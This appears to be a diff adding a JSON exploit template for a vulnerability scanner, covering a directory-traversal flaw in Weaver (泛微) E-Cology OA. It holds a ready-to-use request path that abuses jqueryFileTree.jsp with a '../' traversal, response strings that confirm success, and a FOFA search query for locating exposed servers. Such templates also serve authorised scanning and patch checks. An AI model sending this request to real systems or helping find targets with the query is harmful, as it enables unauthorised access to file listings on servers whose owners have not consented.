@@ -1,0 +1,36 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology jqueryFileTree.jsp 目录遍历",
+  "type": "目录遍历",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微 E-Cology jqueryFileTree.jsp 目录遍历",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-协同办公OA\""
+  },
+  "protocol": "http",
+  "link": "",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "index.jsp"
+        },
+        {
+          "body": "PortalCenter.jsp"
+        }
+      ]
+    }
+  }
+}
